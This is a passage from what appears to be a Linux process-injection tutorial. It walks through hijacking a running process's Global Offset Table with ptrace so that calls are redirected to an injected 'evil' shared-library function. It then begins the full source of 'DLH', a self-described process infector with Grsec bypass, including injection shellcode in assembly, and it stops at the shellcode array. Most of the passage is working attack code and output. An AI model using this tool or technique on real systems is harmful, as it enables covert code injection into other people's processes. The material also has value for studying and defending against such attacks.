&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>A final note on obtaining where sysenter exists:</p>
<p>Another way to locate sysenter would be to parse the stack of the process and get the AUXV AT_SYSINFO entry which contains the location of either sysenter or somewhere right near there, I haven't tried this, but I stumbled upon it as a possibility while examining that entry.</p>
<p><strong>Step 9</strong></p>
<p>In order to access our parasite code, which is a replacement function, we must locate the base address of our shared library now that it is mapped into the target process image. A processes memory maps are displayed in /proc/&lt;pid&gt;/maps, as will the mapping of our shared object, thus parsing this file is sufficient. Our shared library is called "libtest.so.1.0"</p>
<pre class="source">08048000-08049000 r-xp 00000000 08:03 4786267    /home/elf/got_hijack/test
08049000-0804a000 r--p 00000000 08:03 4786267    /home/elf/got_hijack/test
0804a000-0804b000 rw-p 00001000 08:03 4786267    /home/elf/got_hijack/test
b7ddf000-b7de0000 rw-p b7ddf000 00:00 0
b7de0000-b7f0a000 r-xp 00000000 08:03 378946     /lib/libc-2.6.1.so
b7f0a000-b7f0c000 r--p 0012a000 08:03 378946     /lib/libc-2.6.1.so
b7f0c000-b7f0d000 rw-p 0012c000 08:03 378946     /lib/libc-2.6.1.so

b7f0d000-b7f11000 rw-p b7f0d000 00:00 0 
       
/* if we do this the grsec way, you want the base of the text */
/* and you will see two mappings for libtest.so.1.0, the text */
/* will be maped as r-xp and the data will be rw-p */

b7f1b000-b7f1d000 rwxp 00000000 08:03 4786297    /home/elf/libtest.so.1.0
b7f1d000-b7f1e000 rw-p b7f1d000 00:00 0
b7f1e000-b7f38000 r-xp 00000000 08:03 378903     /lib/ld-2.6.1.so
b7f38000-b7f39000 r--p 00019000 08:03 378903     /lib/ld-2.6.1.so
b7f39000-b7f3a000 rw-p 0001a000 08:03 378903     /lib/ld-2.6.1.so
bfb24000-bfb39000 rw-p bffeb000 00:00 0          [stack]
ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
</pre>
<p>As you can see the base address is b7f1b000. A simple function to extract this value is used in the hijacker provided later on, it is important to note that with grsec these addresses will not be available, in which case we should just get the address from %eax after mmap'ng it.</p>
<p><strong>Step 10</strong></p>
<p>Now that we have the base address of our shared object, we need to locate the evil function itself so that we can store it in the GOT, and also patch its "transfer code" with the address of the original function for when we need to transfer execution back (remember that the transfer code is the ending code in the parasite -- either a function pointer, or a jump --</p>
<p>One method to find our evil function is to scan memory for its signature code sequence. We can use the first 8 bytes as the code sequence... lets look at the following parasite:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;<br>
&nbsp; origfunc<span style="color: black;">(</span>new_string<span style="color: black;">)</span>;<br>
<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Using objdump we can disassemble it to find its signature</p>
<pre class="source">00000248 &lt;evilprint&gt;:
 248:   55                      push   %ebp
 249:   89 e5                   mov    %esp,%ebp
 24b:   83 ec 18                sub    $0x18,%esp
 24e:   c6 45 f7 65             movb   $0x65,-0x9(%ebp)
 252:   c6 45 f8 76             movb   $0x76,-0x8(%ebp)
 256:   c6 45 f9 69             movb   $0x69,-0x7(%ebp)
 25a:   c6 45 fa 6c             movb   $0x6c,-0x6(%ebp)
 25e:   c6 45 fb 00             movb   $0x0,-0x5(%ebp)
 262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)
 269:   83 ec 0c                sub    $0xc,%esp
 26c:   8d 45 f7                lea    -0x9(%ebp),%eax
 26f:   50                      push   %eax
 270:   8b 45 fc                mov    -0x4(%ebp),%eax
 273:   ff d0                   call   *%eax
 275:   83 c4 10                add    $0x10,%esp
 278:   c9                      leave
 279:   c3                      ret
</pre>
<p>The first 3 bytes '\x55\x89\xe5' are standard prologue, so lets use those to mark the start of a function, and include the following 5 bytes as well. Then we will have a unique signature to mark where our parasite starts within memory:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evilsig<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>55<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e5<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>c6<span style="color: #000099; font-weight: bold;">\x</span>45"</span>;</div>
<p>It may be wise to use a larger signature, but our example shared library is very small and its safe to say that the first 8 bytes are unique to our function only. In order to get the address of our evil function we simply use ptrace PEEKTEXT request to read our shared object mapping into a buffer starting at its base address that we extracted from the map file. i.e </p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>, j = <span style="color: #cc66cc;">0</span>; i &lt; size; i+= <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>uint32_t<span style="color: black;">)</span>, j++<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span><span style="color: black;">(</span><span style="color: black;">(</span>data = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr + i<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span> &amp;&amp; errno<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j<span style="color: black;">]</span> = data;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Then search for our signature:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; LIBSIZE; i++<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>buf<span style="color: black;">[</span>i<span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+4</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+5</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+6</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">6</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+7</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">7</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;evilvaddr = <span style="color: black;">(</span>vaddr + i<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Another method, which is simpler and better, although I didn't think of it when initially writing the code, is to find the offset of your evil function since it should generally stay consistent. This is trivial and can be implemented easier than the method shown above. i.e</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">evilvaddr = base + offset;</div>
<p><strong>Step 11-13</strong></p>
<p>In addition to modifying the GOT entry with the address of our evil function, we need to patch the transfer code in the evil function with the memory address of the original function. If you scroll back up to the disassembled evil function "evilprint" and look on the 9th line you will see the transfer code that we must patch:</p>
<pre class="source">262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)</pre>
<p>That line is the function pointer assignment we did in C --</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;</div>
<p>We need to locate that within the evil function and patch it with the memory address of the original function. How do we get the address of the original function? If you recall, the get_plt() code I demonstrated in step 2 will pull the relocation entries which contain virtual address/offsets into the global offset table where we can find what we need.</p>
<p>Using some code I wrote that basically pulls relocation offsets, their values, and the corresponding symbols of a running process we can take a look at our test program while running:</p>
<pre class="source">r_offset: 804a000
symbol:   __gmon_start__
export address: 8048306

r_offset: 804a004
symbol:   __libc_start_main
export address: b7dd5f00

r_offset: 804a008
symbol:   sleep
export address: b7e4dbb0

r_offset: 804a00c
symbol:   puts
export address: b7e185c0
</pre>
<p>What is it we are looking at above? The r_offset (relocation offset) is the address in the GOT, the export address is the value stored there. If you notice the export address for puts() is b7e185c0, that is its resolved address in libc -- how do I know that? Due to lazy linking, before puts() gets called the first time (as we learned earlier) it will have a stub address that points back to the PLT, and it will start with '804'.</p>
<p>So our goal is to get the address for puts() stored in the global offset table r_offset -- Here is an example:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>lp = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>get_plt<span style="color: black;">(</span>mem<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"get_plt() failed<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp;<span style="color: black;">}</span><br>
&nbsp;<br>
&nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; lp<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span>; i++<span style="color: black;">)</span><br>
&nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, <span style="color: #ff0000;">"puts"</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw() uses ptrace to perform several tasks, including<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retrieving the original function address from the GOT, and <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; overwriting it with the new function (evilprint) address <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; the memrw() MODIFY_GOT request will return the final value <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; of the GOT entry, which should contain the address of the new <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; function, this way we can check to make sure its been properly<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; updated.<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span><br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;export = memrw<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">offset</span>, MODIFY_GOT, pid, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>export == evilfunc<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Successfully modified GOT entry<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed at modifying GOT entry<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"New GOT value: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, export<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp;<span style="color: black;">}</span><br>
&nbsp;</div>
<p>We've now retrieved the original address of the function we are hijacking, and modified the GOT entry with the address to our evil function. We need to carry out the final step and patch the evil functions transfer code, so that when its done it can call the original function. We need to use our memrw() function (the src for it is revealed in the included hijacker) to read our evil function into a buffer and determine the address of where to patch the transfer code:</p>
<p>Remember our transfer code signature -- c7 45 fc 00 00 00 00 -- we want to patch it with the address of the original function starting right after '\xc7\x45\xfc\'.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evil_code<span style="color: black;">[</span><span style="color: #cc66cc;">256</span><span style="color: black;">]</span>;<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> injection_vaddr = <span style="color: #cc66cc;">0</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* tc[] is short for transfer_code[] */</span><br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tc<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>45<span style="color: #000099; font-weight: bold;">\x</span>fc<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* get a copy of our replacement function and search for transfer sequence */</span><br>
memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>evil_code, evilfunc, <span style="color: #cc66cc;">256</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* once located, patch it with the addr of the original function */</span><br>
<br>
<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">256</span>; i++<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>evil_code<span style="color: black;">[</span>i<span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Located transfer code; patching it with %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, original<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; injection_vaddr = <span style="color: black;">(</span>evilfunc + i<span style="color: black;">)</span> + <span style="color: #cc66cc;">3</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>At this point we can patch it with:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">memrw<span style="color: black;">(</span><span style="color: #cc66cc;">0</span>, injection_vaddr, INJECT_TRANSFER_CODE, pid, original<span style="color: black;">)</span>;</div>
<p><strong>Step 14</strong></p>
<p>We can now detach from the process and enjoy.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
&nbsp;</div>
<h2><a name="c7"></a>7 - The Hijacker</h2>
<p>I have included the complete hijacker and an example parasite. The hijacker can be used on any process of type ET_EXEC, or ET_DYN. The only aspects of the source code that need to be modified are the signatures for the evil function and the transfer code, as these will vary but are easily found using objdump. The shellcode to load the shared library assumes that the shared library is called libtest.so.1.0 and exists in /lib directory. The shellcode is available in its ASM form for modifications below.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* start of dlh.c */</span><br>
<span style="color: #808080; font-style: italic;">/*<br>
&nbsp;* DLH (Dynamic Link Hijacker) v0.1 (C) Ryan O'Neill 2009<br>
&nbsp;* process infector through GOT modification and shared object linking<br>
&nbsp;* features include ET_DYN processes, and Grsec memory protection bypassing<br>
&nbsp;* for code injection.<br>
&nbsp;*<br>
&nbsp;* Author: Ryan O'Neill<br>
&nbsp;* &lt;ryan@bitlackeys.com&gt; <br>
&nbsp;* <br>
&nbsp;* gcc dlh.c -o dlh<br>
&nbsp;* ./dlh &lt;pid&gt; &lt;function to hijack&gt; [opts]<br>
&nbsp;*<br>
&nbsp;*/</span><br>
<br>
<span style="color: #339933;">#include &lt;stdio.h&gt;</span><br>
<span style="color: #339933;">#include &lt;string.h&gt;</span><br>
<span style="color: #339933;">#include &lt;unistd.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/ptrace.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/mman.h&gt;</span><br>
<span style="color: #339933;">#include &lt;elf.h&gt;</span><br>
<span style="color: #339933;">#include &lt;fcntl.h&gt;</span><br>
<span style="color: #339933;">#include &lt;errno.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/stat.h&gt;</span><br>
<span style="color: #339933;">#include &lt;signal.h&gt;</span><br>
<span style="color: #339933;">#include &lt;stdlib.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/wait.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/user.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/syscall.h&gt;</span><br>
<br>
<span style="color: #339933;">#define ORIG_EAX 11</span><br>
<span style="color: #339933;">#define MAXBUF 255</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* memrw() request to modify global offset table */</span><br>
<span style="color: #339933;">#define MODIFY_GOT 1</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* memrw() request to patch parasite */</span><br>
<span style="color: #808080; font-style: italic;">/* with original function address */</span><br>
<span style="color: #339933;">#define INJECT_TRANSFER_CODE 2</span><br>
<br>
<span style="color: #339933;">#define EVILLIB "libtest.so.1.0"</span><br>
<span style="color: #339933;">#define EVILLIB_FULLPATH "/lib/libtest.so.1.0"</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* should be getting lib mmap size dynamically */</span><br>
<span style="color: #808080; font-style: italic;">/* from map file; this #define is temporary */</span><br>
<span style="color: #339933;">#define LIBSIZE 5472 </span><br>
<br>
<span style="color: #808080; font-style: italic;">/* struct to get symbol relocation info */</span><br>
<span style="color: #993333;">struct</span> linking_info<br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> name<span style="color: black;">[</span><span style="color: #cc66cc;">256</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> index;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> count;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t offset;<br>
<span style="color: black;">}</span>;<br>
<br>
<span style="color: #993333;">struct</span> segments<br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> text_off;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> text_len;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> data_off;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> data_len;<br>
<span style="color: black;">}</span> segment;<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> original;<br>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">int</span> getstr;<br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> text_base;<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> data_segment;<br>
<span style="color: #993333;">char</span> static_sysenter = <span style="color: #cc66cc;">0</span>; <br>
<br>
<span style="color: #808080; font-style: italic;">/*<br>
_start:<br>
&nbsp; &nbsp; &nbsp; &nbsp; jmp B<br>
A:<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # fd = open("libtest.so.1.0", O_RDONLY);<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %ecx, %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; movb $5, %al<br>
&nbsp; &nbsp; &nbsp; &nbsp; popl %ebx<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %ecx, %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; subl $24, %esp<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %edx, %edx<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %edx, (%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $8192,4(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $7, 8(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $2, 12(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %eax,16(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %edx, 20(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $90, %eax<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %esp, %ebx<br>
&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; int3<br>
B:<br>
&nbsp; &nbsp; &nbsp; &nbsp; call A<br>
&nbsp; &nbsp; &nbsp; &nbsp; .string "/lib/libtest.so.1.0"<br>
*/</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* make sure to put your shared lib in /lib and name it libtest.so.1.0 */</span><br>
<span style="color: #993333;">char</span> mmap_shellcode<span style="color: black;">[</span><span style="color: black;">]</span> = <br>
